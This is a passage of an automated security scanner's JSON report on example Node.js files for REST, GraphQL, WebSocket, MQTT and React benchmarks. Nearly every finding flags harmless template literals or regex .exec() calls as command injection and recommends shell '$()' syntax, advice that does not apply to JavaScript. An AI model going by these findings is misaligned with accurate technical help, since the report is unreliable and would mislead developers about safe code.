      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
      "line_number": 204,
      "issue": "Backtick command execution",
      "evidence": "links.next = `${baseUrl}?${queryParams}&offset=${offset + limit}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
      "line_number": 236,
      "issue": "Backtick command execution",
      "evidence": "message: `User with id ${userId} not found`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
      "line_number": 242,
      "issue": "Backtick command execution",
      "evidence": "const etag = `\"${new Date(user.updated_at).getTime()}\"`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
      "line_number": 267,
      "issue": "Backtick command execution",
      "evidence": "message: `User with email ${email} already exists`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
      "line_number": 286,
      "issue": "Backtick command execution",
      "evidence": ".set('Location', `/api/users/${newUser.id}`)",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
      "line_number": 305,
      "issue": "Backtick command execution",
      "evidence": "message: `User with id ${userId} not found`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
      "line_number": 334,
      "issue": "Backtick command execution",
      "evidence": "message: `User with id ${userId} not found`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
      "line_number": 360,
      "issue": "Backtick command execution",
      "evidence": "message: `User with id ${userId} not found`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
      "line_number": 381,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Server running on port ${PORT}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
      "line_number": 382,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Health check: http://localhost:${PORT}/health`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
      "line_number": 383,
      "issue": "Backtick command execution",
      "evidence": "console.log(`API: http://localhost:${PORT}/api/users`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
      "line_number": 119,
      "issue": "Backtick command execution",
      "evidence": "console.error(`Warming up with ${this.options.warmup} requests...`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
      "line_number": 126,
      "issue": "Backtick command execution",
      "evidence": "console.error(`Running ${this.options.iterations} iterations with concurrency ${this.options.concurrent}...`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
      "line_number": 193,
      "issue": "Backtick command execution",
      "evidence": "reject(new Error(`HTTP ${res.statusCode}: ${data}`));",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
      "line_number": 200,
      "issue": "Backtick command execution",
      "evidence": "reject(new Error(`GraphQL errors: ${JSON.stringify(json.errors)}`));",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
      "line_number": 206,
      "issue": "Backtick command execution",
      "evidence": "reject(new Error(`JSON parse error: ${error.message}`));",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
      "line_number": 241,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  Total: ${stats.totalRequests}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
      "line_number": 242,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  Successful: ${stats.successfulRequests}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
      "line_number": 243,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  Failed: ${stats.failedRequests}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
      "line_number": 244,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  Success Rate: ${stats.successRate.toFixed(2)}%`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
      "line_number": 249,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  Min: ${stats.timings.min.toFixed(2)}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
      "line_number": 250,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  Max: ${stats.timings.max.toFixed(2)}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
      "line_number": 251,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  Avg: ${stats.timings.avg.toFixed(2)}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
      "line_number": 252,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  P50: ${stats.timings.p50.toFixed(2)}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
      "line_number": 253,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  P90: ${stats.timings.p90.toFixed(2)}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
      "line_number": 254,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  P95: ${stats.timings.p95.toFixed(2)}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
      "line_number": 255,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  P99: ${stats.timings.p99.toFixed(2)}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
      "line_number": 260,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  Requests/sec: ${stats.throughput.requestsPerSecond.toFixed(2)}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
      "line_number": 265,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  Avg Query Size: ${stats.sizes.avgQuerySize.toFixed(0)}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
      "line_number": 266,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  Avg Response Size: ${stats.sizes.avgResponseSize.toFixed(0)}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
      "line_number": 273,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  - ${error}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
      "line_number": 276,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  ... and ${stats.errors.length - 10} more`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/examples/node/dynamodb_trigger.js",
      "line_number": 17,
      "issue": "Backtick command execution",
      "evidence": "console.error(`Error processing record ${record.eventID}:`, error);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/examples/node/dynamodb_trigger.js",
      "line_number": 27,
      "issue": "Backtick command execution",
      "evidence": "message: `Processed ${event.Records.length} records`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/examples/node/dynamodb_trigger.js",
      "line_number": 36,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Processing ${eventName} event from ${tableName}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/examples/node/dynamodb_trigger.js",
      "line_number": 49,
      "issue": "Backtick command execution",
      "evidence": "console.warn(`Unknown event type: ${eventName}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/examples/node/dynamodb_trigger.js",
      "line_number": 64,
      "issue": "Backtick command execution",
      "evidence": "message: `New item created: ${JSON.stringify(item)}`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/examples/node/dynamodb_trigger.js",
      "line_number": 84,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Status changed: ${oldItem.status} -> ${newItem.status}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/examples/node/dynamodb_trigger.js",
      "line_number": 88,
      "issue": "Backtick command execution",
      "evidence": "message: `Item ${newItem.id} status: ${oldItem.status} -> ${newItem.status}`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
      "line_number": 114,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Client ${ws.id} joined room: ${room} (${rooms.get(room).size} members)`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
      "line_number": 143,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Client ${ws.id} left room: ${ws.room}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
      "line_number": 189,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Message in room ${ws.room}: ${data.content} (sent to ${sent} clients)`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
      "line_number": 207,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Broadcast: ${data.content} (sent to ${sent} clients)`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
      "line_number": 241,
      "issue": "Backtick command execution",
      "evidence": "ws.userId = `user_${ws.id.slice(0, 8)}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
      "line_number": 248,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Client connected: ${ws.id} (${req.socket.remoteAddress})`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
      "line_number": 289,
      "issue": "Backtick command execution",
      "evidence": "console.error(`Error handling ${msg.type}:`, e);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
      "line_number": 298,
      "issue": "Backtick command execution",
      "evidence": "error: `Unknown message type: ${msg.type}`",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
      "line_number": 312,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Client disconnected: ${ws.id} (code: ${code}, reason: ${reason.toString()})`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
      "line_number": 317,
      "issue": "Backtick command execution",
      "evidence": "console.error(`Client error (${ws.id}):`, error.message);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
      "line_number": 325,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Terminating inactive connection: ${ws.id}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
      "line_number": 361,
      "issue": "Backtick command execution",
      "evidence": "console.log(`WebSocket server running on ws://localhost:${PORT}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
      "line_number": 362,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Health check: http://localhost:${PORT}/health`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
      "line_number": 363,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Metrics: http://localhost:${PORT}/metrics`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-client.js",
      "line_number": 53,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Connecting to ${this.url}...`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-client.js",
      "line_number": 103,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Flushing message queue (${this.messageQueue.length} messages)`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-client.js",
      "line_number": 176,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Disconnected: code=${code}, reason=${reason.toString()}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-client.js",
      "line_number": 227,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Reconnecting in ${actualDelay}ms (attempt ${this.reconnectAttempts})`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-client.js",
      "line_number": 274,
      "issue": "Backtick command execution",
      "evidence": "content: `Hello at ${new Date().toISOString()}`",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-client.js",
      "line_number": 281,
      "issue": "Backtick command execution",
      "evidence": "console.log(`[EVENT] Disconnected: ${code} - ${reason}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-client.js",
      "line_number": 285,
      "issue": "Backtick command execution",
      "evidence": "console.log(`[EVENT] Reconnecting (attempt ${attempt}, delay ${delay}ms)`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/http2-multiplexing/resources/examples/node/http2-server.js",
      "line_number": 28,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Request: ${headers[':method']} ${path}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/http2-multiplexing/resources/examples/node/http2-server.js",
      "line_number": 211,
      "issue": "Backtick command execution",
      "evidence": "stream.end(`Content for ${requestPath}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/http2-multiplexing/resources/examples/node/http2-server.js",
      "line_number": 288,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Response for ${path}: ${headers[':status']}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/http2-multiplexing/resources/examples/node/http2-server.js",
      "line_number": 297,
      "issue": "Backtick command execution",
      "evidence": "console.log(`${path} complete (${data.length} bytes)`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/http2-multiplexing/resources/examples/node/http2-server.js",
      "line_number": 321,
      "issue": "Backtick command execution",
      "evidence": "console.log(`${method} ${path}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/http2-multiplexing/resources/examples/node/http2-server.js",
      "line_number": 364,
      "issue": "Backtick command execution",
      "evidence": "name: `User ${userId}`",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
      "line_number": 17,
      "issue": "Backtick command execution",
      "evidence": "clientId: options.clientId || `mqtt_client_${Math.random().toString(16).slice(2, 10)}`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
      "line_number": 36,
      "issue": "Backtick command execution",
      "evidence": "console.log(`\u2713 Connected to ${this.brokerUrl}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
      "line_number": 37,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  Session present: ${connack.sessionPresent}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
      "line_number": 48,
      "issue": "Backtick command execution",
      "evidence": "console.error(`\u2717 Connection error: ${error.message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
      "line_number": 69,
      "issue": "Backtick command execution",
      "evidence": "console.log(`\ud83d\udce5 [${topic}] (QoS ${qos}, retain=${retain}): ${message.substring(0, 100)}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
      "line_number": 85,
      "issue": "Backtick command execution",
      "evidence": "console.error(`\u2717 Subscribe failed: ${err.message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
      "line_number": 88,
      "issue": "Backtick command execution",
      "evidence": "console.log(`\u2713 Subscribed to ${topic} (granted QoS: ${granted[0].qos})`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
      "line_number": 106,
      "issue": "Backtick command execution",
      "evidence": "console.error(`\u2717 Publish failed: ${err.message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
      "line_number": 109,
      "issue": "Backtick command execution",
      "evidence": "console.log(`\u2713 Published to ${topic}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
      "line_number": 176,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Handler: ${topic} -> ${payload}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/resources/amqp-rabbitmq/examples/nodejs/consumer_with_retry.js",
      "line_number": 107,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Attempt ${retryCount + 1}/${maxRetries + 1}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/resources/amqp-rabbitmq/examples/nodejs/consumer_with_retry.js",
      "line_number": 130,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Retrying (attempt ${retryCount + 1}/${maxRetries})...`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/resources/amqp-rabbitmq/examples/nodejs/consumer_with_retry.js",
      "line_number": 148,
      "issue": "Backtick command execution",
      "evidence": "console.log(`\\nConsuming from queue: ${this.queueName}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/http3-quic/resources/examples/cloudflare_worker_http3.js",
      "line_number": 164,
      "issue": "Backtick command execution",
      "evidence": "message: `Event ${i}`",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
      "line_number": 57,
      "issue": "Backtick command execution",
      "evidence": "const node = new ComponentTree(`Component-${i}`, i, 'useState');",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
      "line_number": 81,
      "issue": "Backtick command execution",
      "evidence": "const node = new ComponentTree(`Consumer-${i}`, i, 'context');",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
      "line_number": 112,
      "issue": "Backtick command execution",
      "evidence": "const node = new ComponentTree(`OptConsumer-${i}`, i, 'contextOptimized');",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
      "line_number": 165,
      "issue": "Backtick command execution",
      "evidence": "const node = new ComponentTree(`ZustandComp-${i}`, i, 'zustand');",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
      "line_number": 206,
      "issue": "Backtick command execution",
      "evidence": "const node = new ComponentTree(`JotaiComp-${i}`, i, 'jotai');",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
      "line_number": 283,
      "issue": "Backtick command execution",
      "evidence": "console.error(`Running benchmarks with depth=${config.depth}, updates=${config.updates}...`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
      "line_number": 316,
      "issue": "Backtick command execution",
      "evidence": "const avgTime = `${result.avgTimePerUpdate}ms`.padEnd(15);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
      "line_number": 320,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`${pattern} | ${avgTime} | ${avgRenders} | ${totalRenders}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
      "line_number": 330,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  Best: ${best.pattern} (${best.avgRendersPerUpdate} renders/update)`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
      "line_number": 331,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  Worst: ${worst.pattern} (${worst.avgRendersPerUpdate} renders/update)`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
      "line_number": 332,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  Ratio: ${ratio}x difference`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
      "line_number": 31,
      "issue": "Backtick command execution",
      "evidence": "console.error(`Error analyzing ${file}:`, error.message);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "HIGH",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
      "line_number": 99,
      "issue": "exec() usage",
      "evidence": "// NOTE: .exec() is regex pattern matching, not command execution - no security risk",
      "recommendation": "Avoid exec() or strictly validate input"
    },
    {
      "severity": "HIGH",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
      "line_number": 100,
      "issue": "exec() usage",
      "evidence": "while ((match = functionPattern.exec(content)) !== null) {",
      "recommendation": "Avoid exec() or strictly validate input"
    },
    {
      "severity": "HIGH",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
      "line_number": 111,
      "issue": "exec() usage",
      "evidence": "while ((match = arrowPattern.exec(content)) !== null) {",
      "recommendation": "Avoid exec() or strictly validate input"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
      "line_number": 181,
